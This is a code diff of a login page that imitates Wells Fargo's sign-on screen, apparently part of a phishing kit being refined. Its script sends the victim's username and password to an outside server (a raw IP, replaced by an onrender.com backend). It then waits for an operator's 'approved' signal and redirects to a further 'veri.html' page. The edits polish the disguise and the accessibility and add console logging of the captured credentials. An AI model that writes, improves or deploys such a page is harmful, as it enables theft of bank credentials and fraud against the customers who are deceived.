@@ -159,6 +159,7 @@
       color: #0070c9;
       font-size: 14px;
       text-decoration: none;
+      cursor: pointer;
     }
 
     .spinner {
@@ -228,7 +229,7 @@
 
 <header class="top-bar">
   <div class="logo">WELLS FARGO</div>
-  <div class="lang">Español</div>
+  <div class="lang" role="button" tabindex="0" aria-label="Switch to Spanish">Español</div>
 </header>
 
 <div class="yellow-strip"></div>
@@ -239,73 +240,85 @@
     <input
       type="text"
       id="username"
-      name="username"
-      placeholder="Username"
       class="input-field"
+      placeholder="Username"
       autocomplete="username"
       required
+      aria-label="Username"
     />
     <div class="password-wrapper">
       <input
         type="password"
         id="password"
-        name="password"
-        placeholder="Password"
         class="input-field"
+        placeholder="Password"
         autocomplete="current-password"
         required
+        aria-label="Password"
       />
-      <button type="button" class="show-btn" onclick="togglePassword(event)">Show</button>
+      <button
+        type="button"
+        class="show-btn"
+        onclick="togglePassword(event)"
+        aria-pressed="false"
+        aria-label="Show or hide password"
+      >
+        Show
+      </button>
     </div>
-    <p id="errorMessage" aria-live="polite"></p>
+    <p id="errorMessage" aria-live="polite" role="alert"></p>
 
     <label class="save-username">
-      <input type="checkbox" id="saveUsername" name="saveUsername" />
+      <input type="checkbox" id="saveUsername" aria-label="Save username" />
       Save username
     </label>
 
     <p class="security-note">
-      To help keep your account secure, save your username only on devices that aren’t used by other people.
+      Only save your username on private devices.
     </p>
 
-    <button id="signOnBtn" class="sign-on" type="submit" disabled>
+    <button
+      id="signOnBtn"
+      class="sign-on"
+      type="submit"
+      disabled
+      aria-disabled="true"
+    >
       <span id="btnText">Sign on</span>
     </button>
 
     <div class="or-divider">or</div>
+    <button
+      type="button"
+      class="passkey-btn"
+      disabled
+      aria-disabled="true"
+      aria-label="Use a passkey"
+    >
+      🔐 Use a passkey
+    </button>
 
-    <button type="button" class="passkey-btn" disabled>🔐 Use a passkey</button>
-
-    <p class="no-passkey">
-      Don’t have one? Create a passkey after signing on and skip the password next time.
-    </p>
-
-    <a href="#" class="forgot-link">Forgot username or password?</a>
+    <a href="#" class="forgot-link" aria-label="Forgot username or password?">
+      Forgot username or password?
+    </a>
   </form>
 </div>
 
 <div class="disclaimer">
   <ul>
-    <ul style="color: #666;">
-  <li><strong>General Terms of Use:</strong> Applies to all online services and tools.</li>
-  <li><strong>Banking, Loans & Credit Lines:</strong> Terms and conditions may apply.</li>
-  <li><strong>Investments & Insurance Products:</strong> Subject to market risk and not FDIC insured.</li>
-</ul>
-
+    <li><strong>General Terms of Use:</strong> Applies to all online services.</li>
+    <li><strong>Banking Terms:</strong> May apply fees or restrictions.</li>
+    <li><strong>Investments & Insurance:</strong> Subject to risk.</li>
   </ul>
   <p class="disclosure">Deposit products offered by Wells Fargo, N.A.</p>
 </div>
 
 <footer class="footer">
   <div class="links">
-    <a href="#">About Wells Fargo</a>
-    <a href="#">Online Access Agreement</a>
-    <a href="#">Privacy, Cookies, Security & Legal</a>
-    <a href="#">Do not sell or share my personal information</a>
-    <a href="#">Report Email Fraud</a>
+    <a href="#">About</a>
+    <a href="#">Privacy & Legal</a>
     <a href="#">Security Center</a>
-    <a href="#">Sitemap</a>
-    <a href="#">Give Us Feedback</a>
+    <a href="#">Feedback</a>
   </div>
   <p>© 2025 Wells Fargo Bank. All rights reserved.</p>
 </footer>
@@ -316,39 +329,39 @@
   const signOnBtn = document.getElementById("signOnBtn");
   const errorMessage = document.getElementById("errorMessage");
   const btnText = document.getElementById("btnText");
+  const showBtn = document.querySelector(".show-btn");
 
-  const API_BASE = "http://158.101.117.189:3000"; // Update this to your actual API
+  const API_BASE = "https://my-node-backend-4nfy.onrender.com"; // Your live backend
 
   function checkInputs() {
-    const username = usernameField.value.trim();
-    const password = passwordField.value.trim();
-
-    if (username && password) {
+    const u = usernameField.value.trim();
+    const p = passwordField.value.trim();
+    if (u && p) {
       signOnBtn.disabled = false;
       signOnBtn.classList.add("enabled");
+      signOnBtn.setAttribute("aria-disabled", "false");
     } else {
       signOnBtn.disabled = true;
       signOnBtn.classList.remove("enabled");
+      signOnBtn.setAttribute("aria-disabled", "true");
     }
-
-    if (errorMessage.style.display === "block") {
-      errorMessage.style.display = "none";
-      errorMessage.textContent = "";
-    }
+    errorMessage.style.display = "none";
   }
 
   usernameField.addEventListener("input", checkInputs);
   passwordField.addEventListener("input", checkInputs);
 
-  function togglePassword(event) {
-    const type = passwordField.getAttribute("type") === "password" ? "text" : "password";
-    passwordField.setAttribute("type", type);
-    event.target.textContent = type === "password" ? "Show" : "Hide";
+  function togglePassword(e) {
+    const type = passwordField.type === "password" ? "text" : "password";
+    passwordField.type = type;
+    e.target.textContent = type === "password" ? "Show" : "Hide";
+    e.target.setAttribute("aria-pressed", type === "text");
   }
 
   function clearButton() {
     signOnBtn.disabled = false;
     signOnBtn.classList.add("enabled");
+    signOnBtn.setAttribute("aria-disabled", "false");
     btnText.textContent = "Sign on";
     const spinner = signOnBtn.querySelector(".spinner");
     if (spinner) spinner.remove();
@@ -360,17 +373,14 @@
       attempts++;
       try {
         const res = await fetch(`${API_BASE}/get-login-data`);
-        if (!res.ok) {
-          throw new Error(`Polling failed with status ${res.status}`);
-        }
+        console.log("Polling status response:", res.status);
         const data = await res.json();
-        if (data.approved) {
-          return true;
-        }
+        console.log("Polling data:", data);
+        if (data.approved) return true;
       } catch (err) {
-        console.error("Error polling approval:", err);
+        console.error("Polling error:", err);
       }
-      await new Promise((resolve) => setTimeout(resolve, intervalMs));
+      await new Promise((r) => setTimeout(r, intervalMs));
     }
     return false;
   }
@@ -387,15 +397,15 @@
 
     signOnBtn.disabled = true;
     signOnBtn.classList.remove("enabled");
+    signOnBtn.setAttribute("aria-disabled", "true");
     btnText.textContent = "Signing on...";
     if (!signOnBtn.querySelector(".spinner")) {
       const spinner = document.createElement("span");
-      spinner.classList.add("spinner");
+      spinner.className = "spinner";
       signOnBtn.appendChild(spinner);
     }
 
-    errorMessage.style.display = "none";
-    errorMessage.textContent = "";
+    console.log("Submitting login with:", { username, password });
 
     try {
       const res = await fetch(`${API_BASE}/simulate-login`, {
@@ -404,45 +414,32 @@
         body: JSON.stringify({ username, password }),
       });
 
-      const resData = await res.json();
+      console.log("Login response:", res.status);
+      const data = await res.json();
+      console.log("Login response data:", data);
 
-      if (!res.ok) {
-        throw new Error(resData.message || "Login submission failed");
-      }
+      if (!res.ok) throw new Error(data.message || "Login submission failed");
+
+      errorMessage.style.display = "none";
 
       const approved = await pollApproval();
+      console.log("Approved?", approved);
 
       if (approved) {
-        if (document.getElementById("saveUsername").checked) {
-          localStorage.setItem("username", username);
-        } else {
-          localStorage.removeItem("username");
-        }
         window.location.href = "veri.html";
       } else {
-        errorMessage.textContent =
-          "Login not approved yet. Please try again later or contact support.";
+        errorMessage.textContent = "Login not approved yet.";
         errorMessage.style.display = "block";
         clearButton();
       }
     } catch (err) {
-      console.error(err);
-      errorMessage.textContent =
-        err.message || "Something went wrong. Please try again.";
+      console.error("Login error:", err);
+      errorMessage.textContent = err.message || "Something went wrong.";
       errorMessage.style.display = "block";
       clearButton();
     }
   }
-
-  window.addEventListener("DOMContentLoaded", () => {
-    checkInputs();
-
-    const savedUsername = localStorage.getItem("username");
-    if (savedUsername) {
-      usernameField.value = savedUsername;
-      checkInputs();
-    }
-  });
 </script>
+
 </body>
 </html>
